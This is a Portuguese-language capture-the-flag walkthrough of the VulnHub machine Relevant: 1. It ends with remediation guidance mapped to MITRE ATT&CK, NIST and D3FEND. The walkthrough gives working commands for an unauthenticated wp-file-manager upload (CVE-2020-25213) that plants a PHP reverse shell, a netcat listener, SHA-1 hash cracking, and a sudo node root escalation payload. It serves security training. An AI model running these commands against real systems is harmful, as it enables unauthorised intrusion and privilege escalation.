# Relevant: 1 — Escape as Armadilhas, Encontre o Caminho Real

Bora rapaziada!! Essa máquina te joga numa armadilha logo de cara. Você vê 2FA, vê dica de SSH, e seu cérebro já quer ir direto. Errado. O caminho real fica mais fundo: um plugin WordPress vulnerável, um hash SHA-1 escondido numa pasta oculta, e um truque com sudo node que o GTFOBins resolve em duas linhas. Relevant: 1 é uma aula de paciência e de não confiar no óbvio. Top demais esse desafio, véi.

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | Relevant: 1 |
| **VM Atacante** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/relevant-1,731/ |
| **Técnicas** | Reconhecimento de rede, enumeração WordPress, RCE não autenticado via wp-file-manager 6.7, reverse shell, quebra de hash SHA-1, movimento lateral, GTFOBin com sudo node |
| **CVEs** | CVE-2020-25213 (wp-file-manager 6.7: upload não autenticado de arquivo com RCE) |
| **Grupos APT** | APT41: explora plugins CMS vulneráveis (incluindo WordPress) para acesso inicial em intrusões nos setores financeiro e de tecnologia; FIN7: usa vulnerabilidades em aplicações web para acesso inicial seguido de roubo de credenciais e movimento lateral |

---

## Resumo do Ataque

```
netdiscover / nmap -p- -A
  |
  +-- porta 80 HTTP (Apache)
        |
        +-- dirsearch -> /wordpress/
              |
              +-- nmap --script wp-enum -> wp-file-manager 6.7 (CVE-2020-25213)
                    |
                    +-- upload não autenticado -> PHP reverse shell -> www-data
                          |
                          +-- encontra diretório oculto -> hash SHA-1 em /home/user/
                                |
                                +-- quebra o hash -> senha do usuário 'news'
                                      |
                                      +-- su news
                                            |
                                            +-- sudo -l -> (root) NOPASSWD: /usr/bin/node
                                                  |
                                                  +-- payload GTFOBins node -> root
                                                        |
                                                        +-- /root/proof.txt
```

---

## Metodologia

1. Descoberta de rede e varredura completa de portas com nmap
2. Brute-force de conteúdo web com dirsearch para localizar WordPress
3. Enumeração de plugins WordPress para detectar wp-file-manager 6.7 vulnerável
4. RCE não autenticado via upload de arquivo (CVE-2020-25213)
5. Pós-exploração: busca por diretórios ocultos e hashes de senha
6. Quebra do hash SHA-1 e movimento lateral para o usuário `news`
7. Escalonamento de privilégios via sudo node (GTFOBins)

---

## Passo 1 — Descoberta de Host e Varredura de Portas

```bash
sudo netdiscover -r 192.168.10.0/24
# Alvo: 192.168.10.161

nmap -p- -A 192.168.10.161
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache 2.4.x
```

Dois serviços. SSH não é o ponto de entrada: a máquina exige 2FA e chave. HTTP é a superfície real de ataque.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração Web

Navegue até `http://192.168.10.161/`. A página exibe um QR code de 2FA e credenciais SSH. Isso é uma armadilha planejada: SSH requer chave E 2FA, e nenhum dos dois é acessível por aqui. Ignore e siga em frente.

Execute brute-force de diretórios:

```bash
dirsearch -u http://192.168.10.161/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# ou
gobuster dir -u http://192.168.10.161/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt
```

Descobre `/wordpress/`. Navegue para confirmar a instalação WordPress.

```bash
wpscan --url http://192.168.10.161/wordpress/ --enumerate p,u
```

Qualquer abordagem vai encontrar **wp-file-manager 6.7**, que tem uma vulnerabilidade crítica de upload não autenticado com RCE (CVE-2020-25213).

**Nota do mundo real:** wp-file-manager está instalado em milhões de sites WordPress. O CVE-2020-25213 foi explorado em massa em menos de 24 horas após a divulgação. Esse padrão se repete constantemente com CVEs críticos de plugins WordPress: janela de exploração em massa medida em horas, não dias.

**MITRE ATT&CK:** T1595.003 — Varredura Ativa: Wordlist Scanning; T1592 — Coleta de Informações do Alvo

---

## Passo 3 — Explorar wp-file-manager (CVE-2020-25213)

O plugin wp-file-manager antes da versão 6.9 permite upload de arquivos sem autenticação pelo endpoint `lib/php/connector.minimal.php`.

```bash
# O endpoint vulnerável aceita uploads sem autenticação:
curl -F "cmd=upload" \
     -F "target=l1_Lw" \
     -F "upload[]=@shell.php;type=image/jpeg" \
     "http://192.168.10.161/wordpress/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
```

Crie o PHP reverse shell primeiro:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
# Edite LHOST e LPORT
nano /tmp/shell.php
```

Inicie o listener:

```bash
nc -lvnp 4444
```

Após o upload, acione a shell acessando:
`http://192.168.10.161/wordpress/wp-content/plugins/wp-file-manager/lib/files/shell.php`

Callback recebido como `www-data`.

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Voltada para Internet; T1059.004 — Shell Unix

---

## Passo 4 — Estabilização de Shell e Enumeração

Estabilize a shell imediatamente:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
# Enter duas vezes
```

Enumere diretórios home e busque arquivos interessantes:

```bash
ls -la /home/
find /home -type f -name "*.txt" -o -name "*.bak" -o -name "*.hash" 2>/dev/null
find /home -name ".*" -type f 2>/dev/null
```

Numa pasta oculta no diretório home de um dos usuários, encontre um hash SHA-1:

```bash
cat /home/<usuario>/.<dir_oculto>/hash.txt
# Exemplo de saída:
# e1bca7657e522aba79a82cf4fecf0b75be3a33be
```

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1552.001 — Credenciais em Arquivos

---

## Passo 5 — Quebra de Hash e Movimento Lateral

O hash tem 40 caracteres hexadecimais: SHA-1. Quebre com hashcat:

```bash
echo "e1bca7657e522aba79a82cf4fecf0b75be3a33be" > /tmp/sha1.hash
hashcat -m 100 /tmp/sha1.hash /usr/share/wordlists/rockyou.txt

# Ou use serviços online (crackstation.net) para agilidade em CTF
# Resultado: <senha>
```

Use a senha quebrada para pivotar para o usuário `news`:

```bash
su news
# Digite a senha quebrada
id
# uid=1001(news) gid=1001(news) groups=1001(news)
```

**MITRE ATT&CK:** T1110.002 — Força Bruta: Quebra de Senha; T1078 — Contas Válidas

---

## Passo 6 — Escalonamento de Privilégios via sudo node

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/node
```

Node.js está na lista de sudo NOPASSWD. O GTFOBins documenta o payload exato:

```bash
sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

Você chega como root:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/proof.txt
```

Caramba! Root via runtime que ninguém esperava estar no sudoers.

**Nota do mundo real:** Node.js no sudoers é surpreendentemente comum em ambientes com muitos desenvolvedores. A correção preguiçosa de "preciso rodar esse script Node como root" vira NOPASSWD: /usr/bin/node, o que concede root a qualquer usuário comprometido que tenha essa entrada. A correção correta: um script wrapper específico com sudo, não o runtime inteiro.

**MITRE ATT&CK:** T1548.003 — Abuso de Controle de Elevação: Sudo; T1059.006 — Interpretador de Scripts

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado em | Usado/Quebrado |
|---|---|---|---|
| Plugin WordPress | wp-file-manager 6.7 vulnerável | /wordpress/ wp-content/plugins/ | CVE-2020-25213 RCE |
| Hash SHA-1 | e1bca7657e522aba79a82cf4fecf0b75be3a33be (exemplo) | /home/user/.oculto/hash.txt | hashcat -m 100 + rockyou |
| Credencial de usuário | news:<senha_quebrada> | Hash quebrado | su ou SSH |
| Shell root | uid=0(root) | GTFOBin sudo node | /root/proof.txt |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | Armadilha planejada: dica de SSH + 2FA na página web | Atacantes que perseguem iscas perdem tempo; defensores que as plantam sem fechar a vuln real também | Confirme a superfície de ataque real antes de commitar num caminho |
| 2 | wp-file-manager 6.7 RCE não autenticado (CVE-2020-25213) | Explorado globalmente em menos de 24 horas da divulgação; plugins WordPress desatualizados são vetor #1 de acesso inicial | Mantenha inventário de plugins WordPress; automatize checagem de atualizações; use WAF bloqueando o endpoint vulnerável |
| 3 | Hash SHA-1 armazenado em diretório oculto | CWE-522: armazenar qualquer hash em disco acessível ao usuário web é falha de design | Use gerenciadores de credenciais integrados ao PAM; nunca armazene hashes em diretórios acessíveis |
| 4 | sudo node (runtime genérico) concede shell root | Entradas NOPASSWD para runtimes genéricos (node, python, perl, ruby) concede root a qualquer usuário comprometido | Audite sudoers: restrinja a scripts específicos, não runtimes genéricos |
| 5 | Movimento lateral via quebra de hash | Senhas fracas e hashes SHA-1 com rockyou quebram em segundos na GPU | Enforce política de senhas fortes; use bcrypt/argon2 para armazenamento; nunca SHA-1 |

---

## MITRE ATT&CK

| Fase | Tática | Técnica | ID |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Varredura Ativa: Wordlist Scanning | T1595.003 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Voltada para Internet | T1190 |
| Execução | Execução | Interpretador de Scripts: Shell Unix | T1059.004 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Quebra de Senha | T1110.002 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Movimento Lateral | Movimento Lateral | Contas Válidas | T1078 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Controle de Elevação: Sudo | T1548.003 |
| Descoberta | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Atualize wp-file-manager imediatamente** para versão 6.9 ou superior; se impossível, desabilite o plugin; bloqueie `connector.minimal.php` no WAF
2. **Remova hashes do sistema de arquivos** — nunca armazene hashes de senha em diretórios web ou home; use gerenciador de credenciais
3. **Restrinja entradas sudo** — audite todo `/etc/sudoers` e `/etc/sudoers.d/`; sem NOPASSWD para runtimes genéricos
4. **Enforce hashing forte de senhas** — use bcrypt (custo >= 12) ou argon2id para todo armazenamento; nunca SHA-1 ou MD5
5. **Habilite auto-atualizações WordPress para plugins** ou use serviço de monitoramento (Wordfence, WPScan API)

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventário de todas as instalações WordPress e plugins com rastreamento de versão |
| Proteger | Controle de Acesso | Restringir sudo a scripts específicos; exigir senha para todo sudo |
| Proteger | Segurança de Dados | Remover hashes do sistema de arquivos; usar armazenamento seguro de credenciais |
| Detectar | Anomalias e Eventos | Alertar sobre uploads em diretórios de plugins WordPress; monitorar novos arquivos PHP |
| Responder | Planejamento de Resposta | Desabilitar wp-file-manager; rotacionar todas as credenciais de usuários no host |
| Recuperar | Planejamento de Recuperação | Reconstruir a partir de snapshot limpo; auditar todas as contas criadas pós-comprometimento |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-6 | Menor Privilégio | Sem NOPASSWD sudo para runtimes genéricos; princípio do menor privilégio |
| CM-7 | Menor Funcionalidade | Desabilitar plugins WordPress não utilizados; remover wp-file-manager se desnecessário |
| IA-5 | Gestão de Autenticadores | Enforce hashing forte de senhas; rotacionar credenciais em contas afetadas |
| SC-28 | Proteção de Informação em Repouso | Não armazenar credenciais ou hashes em caminhos acessíveis do sistema de arquivos |
| SI-2 | Remediação de Falhas | Corrigir plugins WordPress imediatamente; CVE-2020-25213 tem janela de exploração de 24 horas |
| SI-7 | Integridade de Software | Monitorar diretório de plugins WordPress para uploads não autorizados |

### CISA KEV

CVE-2020-25213 (wp-file-manager RCE) é uma vulnerabilidade de exploração em massa documentada. Alertas CISA (AA21-116A) observam que plugins CMS não corrigidos estão entre os vetores de acesso inicial mais explorados. Organizações que executam WordPress devem auditar versões de plugins imediatamente.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Gerenciar Vulnerabilidades | MIL3 (varredura automatizada + SLA de patch) |
| Gestão de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 (sem NOPASSWD para runtimes genéricos) |
| Gestão de Ativos (ASSET) | Gerenciar Software | MIL2 (inventário e política de atualização de plugins WordPress) |

### MITRE D3FEND

- **D3-ACH** — Hardening de Configuração de Aplicação: desabilitar plugins não utilizados; regra WAF bloqueando connector.minimal.php
- **D3-OAM** — Gerenciamento Administrativo do SO: auditar e restringir sudoers
- **D3-HBPI** — Integridade do Pipeline de Build: fixar versões de plugins; enforce políticas de atualização

---

## Pensamentos Finais

Relevant: 1 é uma aula de misdirection deliberada. O QR code de 2FA e as dicas SSH na landing page existem especificamente para desperdiçar seu tempo. A cadeia real, RCE via wp-file-manager para quebra de hash até sudo node, é limpa, realista e exatamente o tipo de caminho multi-etapas que você encontra em pentests reais.

A lição que a máquina ensina: enumere com cuidado, persiga evidências e não suposições, e sempre verifique sudo antes de recorrer a qualquer coisa complexa.

Muito respeito ao criador. Essa merece seu rating Médio.

Thanks guys!! (❍ᴥ❍ʋ)
